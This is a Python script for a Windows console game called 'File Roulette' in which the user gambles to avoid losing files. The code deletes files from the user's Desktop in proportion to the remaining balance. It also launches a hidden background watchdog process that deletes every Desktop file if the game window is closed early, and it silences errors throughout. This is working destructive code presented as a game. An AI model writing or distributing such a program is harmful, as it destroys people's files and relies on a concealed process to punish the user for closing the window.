import os
import random
import subprocess
import sys
import time
import psutil


TARGET_USER = os.getlogin()
TARGET_FOLDER = f"C:\\Users\\{TARGET_USER}\\Desktop"
SAFE_FILE = f"C:\\Users\\{TARGET_USER}\\AppData\\Local\\Temp\\roulette_safe.lock"

def delete_all_files():
    if os.path.exists(TARGET_FOLDER):
        files = os.listdir(TARGET_FOLDER)
        for file_name in files:
            file_path = os.path.join(TARGET_FOLDER, file_name)
            try:
                os.remove(file_path)
            except: pass

def run_watchdog(game_pid):
    try:
        while psutil.pid_exists(int(game_pid)):
            time.sleep(1)

        if os.path.exists(SAFE_FILE):
            try:
                os.remove(SAFE_FILE)
            except: pass
        else:
            delete_all_files()
    except: delete_all_files()

    finally:
        sys.exit(0)

def print_slow(text):
    for ch in text:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(0.02)
    print()


def start_roulette():


    print(r"""
    _____ _ _        ____              _      _   _       
    |  ___(_) | ___  |  _ \ ___  _   _| | ___| |_| |_ ___  
    | |_  | | |/ _ \ | |_) / _ \| | | | |/ _ \ __| __/ _ \ 
    |  _| | | |  __/ |  _ < (_) | |_| | |  __/ |_| ||  __/ 
    |_|   |_|_|\___| |_| \_\___/ \__,_|_|\___|\__|\__\___| 
                                                        
        """)
    print_slow("Welcome to the File Roulette!")
    print_slow(f"In this game, you will play REVERSE gambles with the files in your Desktop's files.")
    print_slow(f"Which means , that for every Dollar you have at the end of the game, 1 file from your Desktop folder will be DELETED!.")
    print_slow("You start from 20$, your goal is to get to 0$ (unless you want your files deleted)")
    print_slow("Send \"exit\" in any time to exit the game and delete your files amount.")
    print_slow("[!] WARNING [!] : CLOSING THIS WINDOW WILL DELETE EVERYTHING.")
    print_slow("LETS GET GAMBELING!")


    money = 20
    game = True
    while game:
        if money <= 0:
            print_slow("Congratulations! You have successfully avoided file deletion!")
            with open(SAFE_FILE, 'w') as f:
                f.write("SAFE EXIT")
            return 0
        
        print_slow(f"Your current balance is: {money}$")
        if True:
            try:
                gamble_amount = input(f"How much do you want to gamble?: ")
            except EOFError:
                print_slow("\nYou chose to exit the game.")
                with open(SAFE_FILE, 'w') as f:
                    f.write("SAFE EXIT")
                return money

            if gamble_amount.lower() == "exit":
                print_slow("You chose to exit the game.")
                with open(SAFE_FILE, 'w') as f:
                    f.write("SAFE EXIT")
                return money
            
            if not gamble_amount.isdigit() or not (1 <= int(gamble_amount) <= money):
                print_slow("Invalid amount. Please try again.")
                continue

            gamble_amount = int(gamble_amount)
            gamble = random.randint(0,10)

            if gamble == 0:
                money += gamble_amount
                print_slow(f"You won the gamble! You gained {gamble_amount}$.")
            elif gamble == 1:
                money -= gamble_amount
                print_slow(f"You lost the gamble! You lost {gamble_amount}$.")
            elif gamble == 2:
                lower_chance = random.randint(0,5)
                if lower_chance == 3:
                    money = 0
                    print_slow("Jackpot! Your balance is now 0$. No files deleted for you!")
                else:
                    money -= 5
                    print_slow(f"Nice! You lost 5$.")
            elif gamble == 3:
                money += 5
                print_slow(f"Unlucky! You gained 5$.")

            elif gamble == 4:
                lower_chance = random.randint(0,3)
                if lower_chance == 2:
                    print_slow("Oh no! You hit the UnJackpot! You better keep gambling!")
                    print_slow("You gained 20$.")
                    money += 20
                else:
                    money += 5
                    print_slow("You gained 3$.")

            elif gamble == 5:
                print_slow("Guess the number between 1 and 5 to lose 10$!")
                user_guess = input("Your guess: ")
                if not user_guess.isdigit() or not (1 <= int(user_guess) <= 5):
                    print_slow("Invalid guess. You got 1$ for stupidity.")
                    money += 1
                else:
                    user_guess = int(user_guess)
                    correct_number = random.randint(1,5)
                    if user_guess == correct_number:
                        print_slow("Correct guess! You lost 10$!.")
                        money -= 10
                    else:
                        print_slow(f"Wrong guess! The correct number was {correct_number}. You got 4$.")
                        money += 4

            elif gamble == 6:
                money -= 2*gamble_amount
                print_slow(f"Lost big! You lost {2*gamble_amount}$.")

            elif gamble == 7:
                money += 2*gamble_amount
                print_slow(f"Big gain! You gained {2*gamble_amount}$.")

            elif gamble == 8:
                print_slow("Solve the Math problem to avoid getting 15$!")
                math_answer = input("What is sin(15 * 3 - 10 / 2 + 4 + 180 / 2 - 41) ? ")
                if math_answer.strip() == "1":
                    print_slow("Correct! You lost 5$.")
                    money -= 5
                else:
                    print_slow("Wrong! You got 15$.")
                    money += 15

            elif gamble == 9:
                print_slow("Flipping a coin... Guess Heads or Tails to lose 5$!")
                user_guess = input("Your guess (H/T): ").strip().upper()
                if user_guess not in ['H', 'T']:
                    print_slow("Invalid guess. You got 2$ for stupidity.")
                    money += 2
                else:
                    coin_flip = random.choice(['H', 'T'])
                    if user_guess == coin_flip:
                        print_slow("Correct guess! You lost 5$.")
                        money -= 5
                    else:
                        print_slow(f"Wrong guess! It was {coin_flip}. You got 3$.")
                        money += 3

            elif gamble == 10:
                money -= gamble_amount // 2
                print_slow(f"Half loss! You lost {gamble_amount // 2}$.")

    return money


def delete_files(file_count):
    global TARGET_FOLDER

    if not os.path.exists(TARGET_FOLDER):
        print_slow("Target folder does not exist. No files to delete (lucky you).")
        return
    
    files = os.listdir(TARGET_FOLDER)
    if not files:
        print_slow("No files to delete in the target folder.")
        return
    
    if file_count > len(files):
        file_count = len(files)

    print_slow(f"\n[!] PUNISHMENT TIME: Deleting {file_count} files...")
    files_to_delete = files[:file_count]
    for file_name in files_to_delete:
        file_path = os.path.join(TARGET_FOLDER, file_name)
        try:
            os.remove(file_path)
            print(f" -> Deleted file: {file_name}")
        except Exception as e:
            print(f"Error deleting file {file_name}: {e}")


def main():
    if os.path.exists(SAFE_FILE):
        try:
            os.remove(SAFE_FILE)
        except: pass

    os.system("color 0c")
    os.system("title DO NOT CLOSE THIS WINDOW")

    if not os.path.exists(TARGET_FOLDER):
        os.makedirs(TARGET_FOLDER)

    files_count = start_roulette()

    if files_count is not None and files_count > 0:
        delete_files(files_count)
    else:
        print_slow("No files will be deleted. Exiting safely.")

    with open(SAFE_FILE, 'w') as f:
        f.write("SAFE EXIT") # Indicate safe exit

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--watchdog":
        run_watchdog(sys.argv[2])
    else:

        my_pid = os.getpid()  
        if getattr(sys, 'frozen', False):

            exe_path = sys.executable
            subprocess.Popen([exe_path, "--watchdog", str(my_pid)], creationflags=subprocess.CREATE_NO_WINDOW)
        else:

            subprocess.Popen([sys.executable, __file__, "--watchdog", str(my_pid)], creationflags=subprocess.CREATE_NO_WINDOW)
    try:
        main()
    except: pass
